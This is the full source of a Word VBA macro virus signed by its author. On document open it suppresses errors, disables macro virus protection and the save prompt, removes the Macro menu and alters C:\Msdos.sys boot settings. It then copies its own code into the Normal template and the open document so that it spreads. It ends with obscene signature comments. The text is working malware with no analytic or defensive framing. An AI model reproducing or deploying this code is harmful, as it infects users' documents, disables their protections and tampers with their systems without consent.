Private Sub document_Open(): On Error Resume Next: Options.ConfirmConversions = (0 - 0): Options.SaveNormalPrompt = (1 - 1): Options.VirusProtection = (2 - 2): CommandBars("Tools").Controls("Macro").Delete
If Day(1) Then: SetAttr "C:\Msdos.sys", vbNormal: System.PrivateProfileString("C:\Msdos.sys", "Options", "BootGUI") = "0": SetAttr "C:\Msdos.sys", vbSystem + vbHidden + vbReadOnly
Open "C:\FF.sys" For Output As #1: Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines): Close #1
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\FF.sys"): ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\FF.sys"): ActiveDocument.SaveAs FileName = ActiveDocument.FullName: End Sub
'*;*;*;*;*;*;*;*;*;*;*;*;*;*'
'*~FistFuck:~By~Lys~KovicK~*'
'*~Enjoy~The~HandJob~Bitch~*'
'*'*'*'*'*'*'*'*'*'*'*'*'*'*'
